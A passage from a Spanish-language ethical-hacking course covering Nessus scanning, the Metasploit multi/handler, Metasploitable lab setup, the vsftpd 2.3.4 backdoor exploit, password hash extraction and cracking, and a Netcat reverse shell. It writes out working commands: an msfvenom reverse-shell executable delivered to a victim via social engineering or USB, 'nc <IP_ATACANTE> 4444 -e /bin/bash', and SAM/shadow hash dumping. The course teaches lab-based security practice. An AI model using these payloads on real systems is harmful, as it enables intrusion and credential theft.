- Escoge el tipo de escaneo (ejemplo: "Basic Network Scan")
- Llena los campos:

  - **Name**: "Escaneo de prueba"
  - **Targets**: La IP o el dominio del sistema a analizar (por ejemplo: `192.168.1.105` o `scanme.nmap.org`)

---

#### 3. Guardar y lanzar escaneo

- Clic en **Save**.
- Luego, desde el panel de escaneos, haz clic en **"Launch"**.

El escaneo puede tardar de 1 a 10 minutos, dependiendo del objetivo.

---

#### 4. Ver resultados

Cuando termina, puedes ver:

- Puertos abiertos
- Servicios detectados (FTP, SSH, HTTP, etc.)
- Vulnerabilidades clasificadas por severidad: **Critical**, **High**, **Medium**, **Low**, **Info**

Puedes hacer clic en cada vulnerabilidad para ver:

- DescripciÃ³n
- CVE asociado
- SoluciÃ³n recomendada

---

#### 5. Generar reporte

Puedes exportar el resultado en:

- PDF
- HTML
- CSV

Desde la vista del escaneo â†’ clic en el botÃ³n de **exportar (Export)**.

---

### âœ… Ejemplo completo: escaneo a `scanme.nmap.org`

#### Paso 1: Crear escaneo bÃ¡sico

- Name: `Escaneo de prueba`
- Targets: `scanme.nmap.org`

#### Paso 2: Ejecutar el escaneo

- Launch â†’ espera 3â€“5 minutos.

#### Paso 3: Analizar el resultado

- Vulnerabilidad: por ejemplo, **"SSL Medium Strength Cipher Suites Supported"**
- CVE: `CVE-2016-2183`
- SoluciÃ³n sugerida: Desactivar suites dÃ©biles en la configuraciÃ³n del servidor web.

#### Paso 4: Exportar

- Export as â†’ PDF â†’ "guardar como: escaneo_nessus.pdf"

---

### ğŸ§  Ventajas de Nessus

âœ… FÃ¡cil de usar

âœ… Muy detallado en sus reportes

âœ… Base de datos de vulnerabilidades constantemente actualizada

âœ… Ideal para redes internas, servidores, PCs, routers, etc.

---

### ğŸš« Advertencia Ã©tica

> âš ï¸ **Nunca escanees sistemas que no sean tuyos o que no tengas autorizaciÃ³n explÃ­cita para analizar.** El uso indebido de Nessus puede ser ilegal y violar polÃ­ticas de seguridad.

---

### âœ… En resumen

| Paso | AcciÃ³n                         |
| ---- | ------------------------------ |
| 1    | Instalar Nessus Essentials     |
| 2    | Acceder vÃ­a navegador          |
| 3    | Crear escaneo nuevo            |
| 4    | Ejecutar y analizar resultados |
| 5    | Exportar reporte               |

---

[ğŸ”¼](#Ã­ndice)

---

## **954. Connection Handler**

### ğŸ” Â¿QuÃ© es un Connection Handler?

Un **Connection Handler** (manejador de conexiones) es un mÃ³dulo dentro de herramientas como **Metasploit** que **espera conexiones entrantes** desde mÃ¡quinas objetivo.

Se utiliza para:

- **Escuchar** conexiones de vuelta (reverse shell).
- **Establecer sesiones** con payloads que envÃ­an la conexiÃ³n desde el objetivo hacia el atacante.
- No necesita explotar una vulnerabilidad directamente; solo espera la conexiÃ³n del payload.

Piensa en Ã©l como un "telÃ©fono" que estÃ¡ esperando que alguien lo llame.

---

### ğŸ§  Â¿Para quÃ© sirve?

Sirve principalmente cuando:

1. Has entregado un **payload (ej. reverse shell)** al objetivo manualmente o por ingenierÃ­a social.
2. El objetivo ejecuta el payload.
3. El Connection Handler **recibe la conexiÃ³n** y crea una sesiÃ³n para interactuar con la mÃ¡quina vÃ­ctima.

---

### ğŸ› ï¸ CÃ³mo instalar Metasploit (si aÃºn no lo tienes)

#### En Kali Linux (ya viene instalado normalmente)

```bash
sudo apt update
sudo apt install metasploit-framework
```

#### En Ubuntu

```bash
curl https://raw.githubusercontent.com/rapid7/metasploit-framework/master/msfinstall | sudo bash
```

Para iniciar:

```bash
msfconsole
```

---

### ğŸ§ª Â¿CÃ³mo usar un Connection Handler en Metasploit?

#### ğŸ“Œ Paso 1: Abrir Metasploit

```bash
msfconsole
```

---

#### ğŸ“Œ Paso 2: Usar el mÃ³dulo de Connection Handler

```bash
use exploit/multi/handler
```

Este mÃ³dulo no lanza ataques, solo **espera una conexiÃ³n**.

---

#### ğŸ“Œ Paso 3: Configurar el payload que estÃ¡s esperando

Por ejemplo, un **payload reverse shell** de meterpreter para Windows:

```bash
set payload windows/meterpreter/reverse_tcp
```

---

#### ğŸ“Œ Paso 4: Configurar la IP y puerto de escucha

```bash
set LHOST 192.168.1.100   # Tu IP local o pÃºblica
set LPORT 4444            # Puerto de escucha
```

Verifica con:

```bash
show options
```

---

#### ğŸ“Œ Paso 5: Iniciar el handler

```bash
exploit
```

Ahora Metasploit estÃ¡ **escuchando activamente** en `192.168.1.100:4444`.

---

### ğŸ”¨ Ejemplo completo: ConexiÃ³n con un payload manual

#### ğŸ§± Supuesto escenario

- IP atacante (tu mÃ¡quina con Metasploit): `192.168.1.100`
- IP vÃ­ctima: `192.168.1.105`
- CrearÃ¡s un payload para que la vÃ­ctima lo ejecute.

---

#### Paso 1: Crear el payload

En tu terminal:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o shell.exe
```

Esto genera un ejecutable `shell.exe` que al ser ejecutado enviarÃ¡ una conexiÃ³n de vuelta.

---

#### Paso 2: Configurar el Connection Handler

```bash
msfconsole

use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
exploit
```

Queda "escuchando" en espera de la vÃ­ctima.

---

#### Paso 3: Entregar el payload

Por ingenierÃ­a social o USB, haces que la vÃ­ctima ejecute `shell.exe`.

---

#### Resultado

Cuando la vÃ­ctima ejecuta el archivo, verÃ¡s en tu terminal:

```
[*] Sending stage (175174 bytes) to 192.168.1.105
[*] Meterpreter session 1 opened (192.168.1.100:4444 -> 192.168.1.105:49156)
```

Â¡Tienes acceso a la mÃ¡quina vÃ­ctima! ğŸ¯ Puedes ahora interactuar con el sistema:

```bash
meterpreter > sysinfo
meterpreter > screenshot
meterpreter > shell
```

---

### âœ… Â¿CuÃ¡ndo usar Connection Handler?

- Cuando **ya tienes un payload personalizado** y quieres tener control de la conexiÃ³n.
- En pruebas **sin exploit directo**, como campaÃ±as de phishing.
- En entornos **donde el firewall bloquea conexiones entrantes**, pero permite salientes.

---

### âš ï¸ Advertencia Ã©tica

> Nunca utilices un Connection Handler ni payloads con fines maliciosos. Solo en entornos de laboratorio o con autorizaciÃ³n. Su uso indebido puede ser delito penal.

---

### ğŸ“Œ En resumen

| AcciÃ³n                 | Comando                                       |
| ---------------------- | --------------------------------------------- |
| Iniciar Metasploit     | `msfconsole`                                  |
| Usar handler           | `use exploit/multi/handler`                   |
| Establecer payload     | `set payload windows/meterpreter/reverse_tcp` |
| Configurar IP y puerto | `set LHOST <tu_IP>` / `set LPORT 4444`        |
| Escuchar conexiones    | `exploit`                                     |
| Generar payload manual | `msfvenom -p ... -o shell.exe`                |
| Esperar sesiÃ³n         | `meterpreter session opened`                  |

---

[ğŸ”¼](#Ã­ndice)

---

## **955. InstalaciÃ³n de maquina de pruebas Metasploitable**

### ğŸ›¡ï¸ Â¿QuÃ© es Metasploitable?

**Metasploitable** es una mÃ¡quina virtual **vulnerable a propÃ³sito**, diseÃ±ada por Rapid7 para que puedas practicar legalmente pruebas de penetraciÃ³n y hacking Ã©tico con herramientas como **Metasploit**, **Nmap**, **Nikto**, **WPScan**, etc.

---

### ğŸ¯ Â¿Para quÃ© sirve?

- Entrenarte en **seguridad ofensiva** y **auditorÃ­a de vulnerabilidades**.
- Aprender a usar herramientas como **Nmap, Nessus, Metasploit, Hydra, etc.**
- Simular ataques sin romper la ley (entorno controlado y local).
- Ideal para principiantes en ciberseguridad.

---

### ğŸ’» Â¿QuÃ© necesitas?

1. Una **mÃ¡quina host** (tu laptop o PC).
2. Un **hipervisor** (como **VirtualBox** o **VMware**).
3. Descargar la imagen de **Metasploitable** (generalmente en formato `.vmdk` o `.ova`).
4. Una red configurada para que tus mÃ¡quinas se vean entre sÃ­ (como red interna o adaptador puente).

---

### âœ… Paso 1: Instalar VirtualBox

1. Ve a: [https://www.virtualbox.org/](https://www.virtualbox.org/)
2. Descarga para tu sistema operativo (Windows, macOS, Linux).
3. InstÃ¡lalo como cualquier programa comÃºn.

ğŸ“Œ TambiÃ©n puedes usar **VMware Workstation Player** si prefieres.

---

### âœ… Paso 2: Descargar Metasploitable 2

1. Ve al sitio oficial de Rapid7 (requiere registro gratuito):

   - [https://sourceforge.net/projects/metasploitable/](https://sourceforge.net/projects/metasploitable/)

2. Descarga el archivo `.zip` o `.ova`.

---

### âœ… Paso 3: Importar Metasploitable en VirtualBox

#### Si descargaste un archivo `.ova`

1. Abre VirtualBox.
2. MenÃº: `Archivo` â†’ `Importar servicio virtualizado`.
3. Selecciona el archivo `.ova` y haz clic en **Siguiente**.
4. Acepta la configuraciÃ³n por defecto o personaliza.
5. Clic en **Importar**.

#### Si descargaste `.vmdk` y `.vmx` (mÃ¡s manual)

1. Crea una nueva mÃ¡quina en VirtualBox.
2. Tipo: `Linux`
   VersiÃ³n: `Ubuntu (32-bit)`
3. Memoria: al menos 512 MB.
4. Disco duro: usa un disco duro existente (`.vmdk`) descargado.
5. Finaliza.

---

### âœ… Paso 4: Configurar red (muy importante)

Para comunicarte con Metasploitable desde Kali Linux u otra mÃ¡quina virtual:

- En la configuraciÃ³n de **Red** de Metasploitable:

  - Modo: **Adaptador puente** (usa la red de tu PC).
  - O **Red interna** si todas tus mÃ¡quinas estÃ¡n en VirtualBox.

Haz lo mismo con tu mÃ¡quina atacante (como **Kali Linux**).

---

### âœ… Paso 5: Iniciar sesiÃ³n en Metasploitable

Cuando la mÃ¡quina arranca, verÃ¡s una terminal. Las credenciales por defecto son:

- **Usuario:** `msfadmin`
- **ContraseÃ±a:** `msfadmin`

Â¡Listo! Ya puedes usar la mÃ¡quina.

---

### ğŸ§ª Ejemplo completo de laboratorio

#### ğŸ¯ Objetivo: Usar Kali Linux para escanear Metasploitable con Nmap

##### 1. Verifica IPs

En Kali Linux:

```bash
ip a
```

En Metasploitable:

```bash
ifconfig
```

SupÃ³n que Metasploitable tiene la IP: `192.168.1.110`.

---

##### 2. Escanea con Nmap desde Kali

```bash
nmap -sS -sV -O 192.168.1.110
```

Esto detecta:

- Servicios y puertos abiertos.
- Sistemas operativos.
- Versiones de software vulnerables.

---

##### 3. Ver resultado tÃ­pico

```bash
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1
23/tcp   open  telnet      Linux telnetd
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
139/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
```

Cada uno de esos servicios tiene vulnerabilidades conocidas que puedes practicar con **Metasploit**.

---

### ğŸ’¡ Tip adicional: Instala Kali Linux junto a Metasploitable

Puedes tener en VirtualBox dos mÃ¡quinas:

- Kali Linux: atacante (herramientas de pentest).
- Metasploitable: objetivo (vulnerable).

Y practicar sin internet, en un entorno controlado.

---

### ğŸ›‘ Advertencia Ã©tica

> Usa Metasploitable **solo en entornos locales y controlados**. No lo conectes a internet. No lo uses para atacar redes externas. EstÃ¡ lleno de vulnerabilidades peligrosas.

---

### ğŸ“Œ En resumen

| Elemento             | DescripciÃ³n                                 |
| -------------------- | ------------------------------------------- |
| Hipervisor           | VirtualBox o VMware                         |
| MÃ¡quina vulnerable   | Metasploitable (descarga desde SourceForge) |
| Usuario / ContraseÃ±a | `msfadmin / msfadmin`                       |
| Red                  | Puente o Red Interna                        |
| Escaneo bÃ¡sico       | `nmap -sS -sV -O <IP>`                      |

---

[ğŸ”¼](#Ã­ndice)

---

## **956. ExplotaciÃ³n de servicio FTP**

### ğŸ§  Â¿QuÃ© es FTP?

FTP (**File Transfer Protocol**) es un protocolo que permite **subir y descargar archivos** entre computadoras, tÃ­picamente un cliente y un servidor.

Por ejemplo:

- Subir archivos a un sitio web.
- Descargar actualizaciones de software.

---

### âš ï¸ Â¿Por quÃ© es vulnerable?

FTP puede ser vulnerable por varias razones:

| Vulnerabilidad               | ExplicaciÃ³n                                                |
| ---------------------------- | ---------------------------------------------------------- |
| Credenciales por defecto     | Usuario: `admin` / Clave: `admin`                          |
| FTP anÃ³nimo habilitado       | Permite conectarse sin usuario ni contraseÃ±a               |
| Software obsoleto con fallas | Ej: `vsftpd 2.3.4` tiene una **puerta trasera (backdoor)** |
| TransmisiÃ³n en texto plano   | ContraseÃ±as viajan sin cifrado                             |

---

### ğŸ› ï¸ Herramientas que usaremos

- **Metasploitable 2** â†’ mÃ¡quina vulnerable con FTP inseguro (`vsftpd 2.3.4`)
- **Kali Linux** â†’ mÃ¡quina atacante
- **Nmap** â†’ para escanear el servicio FTP
- **Metasploit** â†’ para explotarlo

---

### ğŸ§ª Laboratorio de explotaciÃ³n de FTP

#### ğŸ”§ PASO 1: Verifica la IP de la mÃ¡quina vÃ­ctima

En **Metasploitable** (login: `msfadmin` / `msfadmin`):

```bash
ifconfig
```

Ejemplo de IP: `192.168.1.110`

---

#### ğŸ” PASO 2: Escanear FTP con Nmap

En tu Kali Linux:

```bash
nmap -sV -p 21 192.168.1.110
```

Resultado esperado:

```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
```

ğŸ” Â¡Esta versiÃ³n es **vulnerable**!

---

#### âš”ï¸ PASO 3: Explotar con Metasploit

1. Abre Metasploit:

```bash
msfconsole
```

2. Busca el mÃ³dulo adecuado:

```bash
search vsftpd
```

VerÃ¡s:

```
exploit/unix/ftp/vsftpd_234_backdoor
```

3. Cargar el mÃ³dulo:

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

4. Ver opciones:

```bash
show options
```

5. Establece el objetivo:

```bash
set RHOSTS 192.168.1.110
```

6. Ejecuta el exploit:

```bash
run
```

---

#### âœ… Resultado esperado

Si todo sale bien, obtendrÃ¡s una **sesiÃ³n de shell**:

```bash
[*] Command shell session 1 opened
id
uid=0(root) gid=0(root)
```

Â¡Has obtenido **acceso root** a la mÃ¡quina vÃ­ctima!

---

### ğŸ” Â¿CÃ³mo evitar esta vulnerabilidad en la vida real?

- No uses versiones antiguas de FTP.
- Usa **SFTP** en lugar de FTP.
- Deshabilita el acceso anÃ³nimo.
- Usa contraseÃ±as fuertes.
- Aplica parches de seguridad.

---

### ğŸ§© Â¿Y si el FTP permite acceso anÃ³nimo?

Puedes probarlo con:

```bash
ftp 192.168.1.110
```

Si no pide credenciales o acepta `anonymous`, puedes:

- Navegar los archivos.
- Descargar o subir archivos (si estÃ¡ mal configurado).
- Buscar archivos con credenciales (por ejemplo `.bash_history`, `.ssh/`, etc.).

---

### ğŸ“š En resumen

| Elemento                 | Detalle                   |
| ------------------------ | ------------------------- |
| Servicio objetivo        | FTP (vsftpd 2.3.4)        |
| Herramientas usadas      | Nmap, Metasploit          |
| Vulnerabilidad explotada | backdoor en vsftpd        |
| Resultado                | Acceso remoto como `root` |

---

[ğŸ”¼](#Ã­ndice)

---

## **957. Extraer y descifrar contraseÃ±as**

### ğŸ§  Â¿QuÃ© significa extraer y descifrar contraseÃ±as?

**Extraer contraseÃ±as**: Es obtener los hashes o claves almacenadas en algÃºn sistema (por ejemplo, en un archivo de Windows o Linux).

**Descifrar contraseÃ±as (cracking)**: Es aplicar tÃ©cnicas para convertir esos hashes en contraseÃ±as en texto plano. Esto se hace usando herramientas como:

- **John the Ripper**
- **Hashcat**

---

### âš ï¸ ADVERTENCIA IMPORTANTE

> Esta informaciÃ³n es solo con fines **educativos y legales**. UtilÃ­zala solo en entornos **controlados**, **laboratorios de prÃ¡ctica** o con **permiso explÃ­cito** del propietario del sistema. El uso indebido es **ilegal**.

---

### ğŸ”§ Herramientas necesarias

- Kali Linux (ya tiene herramientas preinstaladas como John, Hashcat, etc.)
- Hashes extraÃ­dos de algÃºn sistema (por ejemplo, `/etc/shadow` en Linux, o `SAM` en Windows)
- Diccionario de contraseÃ±as (como `rockyou.txt`)

---

### ğŸ” Ejemplo 1: Cracking de contraseÃ±as en Linux

#### ğŸ§ª Paso 1: Extraer contraseÃ±as

En Linux, las contraseÃ±as estÃ¡n en:

- `/etc/passwd` (usuarios)
- `/etc/shadow` (hashes de contraseÃ±as)

Solo el usuario root puede leer `/etc/shadow`.

Ejemplo de lÃ­nea del shadow:

```
juan:$6$X1a2b3c$nd8cGkY9...:18923:0:99999:7:::
```

Este `$6$` indica que el hash usa **SHA-512**.

---

#### ğŸ§ª Paso 2: Crear un archivo con los hashes

Copia las lÃ­neas con hashes a un archivo llamado `hashes.txt`.

---

#### ğŸ§ª Paso 3: Crackear con John the Ripper

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

> John intentarÃ¡ **comparar el hash** con cada palabra del diccionario hasta encontrar una coincidencia.

#### âœ… Ver resultados

```bash
john --show hashes.txt
```

---

### ğŸ” Ejemplo 2: Extraer contraseÃ±as de Windows

#### ğŸ§ª Paso 1: Acceder al sistema

En Windows, los hashes estÃ¡n en:

- **SAM** file: `C:\Windows\System32\config\SAM`
- **SYSTEM** file: necesario para descifrar el SAM

Puedes extraerlos con:

##### ğŸ”¹ Herramienta: `secretsdump.py` (parte de Impacket)

```bash
secretsdump.py -sam SAM -system SYSTEM LOCAL
```

Salida:

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

Este es un **hash NTLM**.

---

#### ğŸ§ª Paso 2: Crackear con Hashcat

Formato NTLM: tipo `1000` en Hashcat.

```bash
hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

- `-m 1000` â†’ Tipo NTLM
- `-a 0` â†’ Ataque con diccionario

#### âœ… Ver resultados

```bash
hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt --show
```

---

### ğŸ§  Tipos de ataques para descifrar contraseÃ±as

| Tipo           | DescripciÃ³n                                           |
| -------------- | ----------------------------------------------------- |
| Diccionario    | Usa lista de palabras comunes                         |
| Fuerza bruta   | Prueba todas las combinaciones posibles               |
| Ataque hÃ­brido | Diccionario + variaciones (mayÃºsculas, nÃºmeros, etc.) |
| Rainbow Tables | Tablas precalculadas de hashes                        |

---

### ğŸ’» InstalaciÃ³n rÃ¡pida de herramientas

#### ğŸ“¦ John the Ripper

Ya viene instalado en Kali. Si no:

```bash
sudo apt install john
```

#### ğŸ“¦ Hashcat

```bash
sudo apt install hashcat
```

---

### âœ… Ejemplo completo

#### ğŸ” Caso prÃ¡ctico: Cracking de hash SHA-512 de Linux

1. Hash SHA-512:

```
$6$randomsalt$zGnZ3NC7FcBrZV90Ef9W19VP3X/3v6ddOk1Ub6qKc3KDc2LsjRi7gYiF1QuP0V65XwvwdrUjOeTgV2yNoLFfP0
```

2. Guardas el hash en `hashes.txt`.

3. Ejecutas John:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

4. Ver resultado:

```bash
john --show hashes.txt
```

Resultado:

```
usuario:contraseÃ±a123
```

---

### ğŸ›¡ï¸ Â¿CÃ³mo prevenir el cracking de contraseÃ±as?

- Usar contraseÃ±as largas y complejas
- Activar doble factor (2FA)
- Usar **bcrypt**, **scrypt** o **argon2** (algoritmos de hashing mÃ¡s seguros)
- Cambiar contraseÃ±as regularmente
- Deshabilitar cuentas inactivas

---

### ğŸ“Œ En resumen

| Elemento          | Ejemplo                              |
| ----------------- | ------------------------------------ |
| Herramientas      | John, Hashcat, secretsdump.py        |
| Hash extraÃ­do     | `$6$...` (SHA-512), `NTLM` (Windows) |
| Diccionario usado | `rockyou.txt`                        |
| Ataque            | Por diccionario                      |
| Resultado         | ContraseÃ±a en texto plano            |

---

[ğŸ”¼](#Ã­ndice)

---

## **958. Netcat a Metasploit Shell**

### ğŸ§  Â¿QuÃ© es Netcat?

**Netcat** es una herramienta de red que permite:

- Establecer conexiones TCP o UDP entre sistemas
- Enviar y recibir datos
- Crear servidores o clientes
- Establecer **reverse shells** o **bind shells**

---

### ğŸ§  Â¿QuÃ© es Metasploit?

**Metasploit Framework** es una plataforma que permite:

- Automatizar explotaciÃ³n de vulnerabilidades
- Crear cargas Ãºtiles (**payloads**)
- Obtener acceso remoto (shells, Meterpreter)
- Mantener persistencia y escalar privilegios

---

### ğŸ¯ Objetivo

Vamos a:

1. Generar una **reverse shell** con Netcat desde un equipo vÃ­ctima.
2. Usar **Metasploit** para capturar esa shell y convertirla en una sesiÃ³n controlada.

---

### ğŸ› ï¸ Requisitos

| MÃ¡quina                  | Rol      | Herramientas        |
| ------------------------ | -------- | ------------------- |
| Kali Linux               | Atacante | Netcat + Metasploit |
| Windows/Linux vulnerable | VÃ­ctima  | Netcat              |

> âš ï¸ Puedes usar **Metasploitable 2 o 3** como vÃ­ctima para pruebas legales y educativas.

---

### ğŸ“¦ InstalaciÃ³n (si aÃºn no tienes las herramientas)

#### ğŸš Netcat (ya viene en Kali, pero por si acaso)

```bash
sudo apt install netcat
```

#### ğŸ¦¾ Metasploit

Kali ya lo tiene. Si no:

```bash
sudo apt update
sudo apt install metasploit-framework
```

Para iniciar:

```bash
msfconsole
```

---

### ğŸ“˜ Conceptos clave

| Tipo de Shell     | Â¿QuiÃ©n inicia la conexiÃ³n? | Puerto abierto en... |
| ----------------- | -------------------------- | -------------------- |
| **Reverse Shell** | La vÃ­ctima                 | Atacante             |
| **Bind Shell**    | La vÃ­ctima                 | VÃ­ctima              |

Usaremos una **reverse shell**, que es mÃ¡s comÃºn.

---

### âœ… Ejemplo completo: Reverse Shell con Netcat y Metasploit

---

#### ğŸ”¹ Paso 1: Preparar Metasploit para recibir la conexiÃ³n

1. Abre una terminal en Kali y lanza Metasploit:

```bash
msfconsole
```

2. Usa el mÃ³dulo `multi/handler`:

```bash
use exploit/multi/handler
```

3. Configura el **payload** para Netcat o una shell inversa:

```bash
set payload cmd/unix/reverse_netcat
```

O si usas un shell de Windows:

```bash
set payload windows/shell/reverse_tcp
```

4. Define la IP del atacante (tu Kali):

```bash
set LHOST <TU_IP_LOCAL>
```

5. Define el puerto que vas a escuchar:

```bash
set LPORT 4444
```

6. Inicia el listener:

```bash
exploit
```

---

#### ğŸ”¹ Paso 2: Ejecutar Netcat en la vÃ­ctima

En la mÃ¡quina vÃ­ctima (puede ser una VM como Metasploitable), ejecutas:

```bash
nc <IP_ATACANTE> 4444 -e /bin/bash
```

Esto:

- Usa `nc` para conectarse al atacante
- El `-e /bin/bash` **envÃ­a una shell bash** al atacante

ğŸ” En Windows serÃ­a algo como:

```powershell
nc.exe <IP_ATACANTE> 4444 -e cmd.exe
```

---

#### ğŸ”¹ Paso 3: Ver la shell en Metasploit

Una vez que la vÃ­ctima ejecuta el comando Netcat, verÃ¡s en Metasploit:

```
[*] Started reverse TCP handler on <tu_ip>:4444
[*] Command shell session 1 opened
```

Ahora puedes escribir comandos directamente:

```bash
whoami
uname -a
ls
```

Â¡Ya tienes una shell remota desde Netcat conectada a Metasploit!

---

### ğŸ§ª Alternativa: Usar `nc` directamente sin Metasploit

Puedes escuchar sin Metasploit asÃ­:

```bash
nc -lvnp 4444
```

Y esperar la conexiÃ³n desde la vÃ­ctima. Pero usando Metasploit puedes:

- Elevar privilegios
- Escalar ataques
- Usar mÃ³dulos automÃ¡ticos

---

### âš ï¸ Importante

- No todos los Netcat tienen el parÃ¡metro `-e`. Algunos lo bloquean por seguridad.
- En sistemas modernos se usa `socat` o payloads mÃ¡s sofisticados.
- Â¡Haz esto **solo en laboratorios controlados** o con autorizaciÃ³n!

---

### ğŸ§  En resumen

| Elemento     | Valor                   |
| ------------ | ----------------------- |
| Herramientas | Netcat, Metasploit      |
| Tipo         | Reverse Shell           |
| Puerto       | 4444                    |
| Uso          | Acceso remoto con shell |

---

[ğŸ”¼](#Ã­ndice)

---

| **Inicio**         | **atrÃ¡s 15**                                                  | **Siguiente 17**                         |
| ------------------ | ------------------------------------------------------------- | ---------------------------------------- |
| [ğŸ ](../README.md) | [âª](./7_15_Escaneo_Activo_y_Analisis_de_Vulnerabilidades.md) | [â©](./7_17_Hacking_Servicios_de_Red.md) |
